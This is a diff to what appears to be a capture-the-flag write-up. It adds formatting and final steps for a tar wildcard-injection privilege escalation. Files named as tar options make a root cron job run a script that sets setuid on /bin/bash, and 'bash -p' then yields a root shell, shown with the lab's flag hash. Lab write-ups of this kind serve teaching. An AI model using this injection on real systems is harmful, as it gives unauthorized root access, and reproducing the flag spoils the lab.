@@ -471,8 +471,25 @@ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
 ```
 
 2. Create these two files --checkpoint-action=exec=sh root_shell.sh and --checkpoint=1 . Here’s how to do that :
-
+```
 touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
 
 touch "/var/www/html/--checkpoint=1"
+```
+3. Now, we can simply obtain a privileged shell by executing the following command : /bin/bash -p
+```
+/bin/bash -p
+```
+```
+/bin/bash -p
+whoami 
+root
+pwd
+/home/milesdyson/backups
+cd /root
+ls
+root.txt
+cat root.txt
+3f0372db24753accc7179a282cd6a949
 
+```
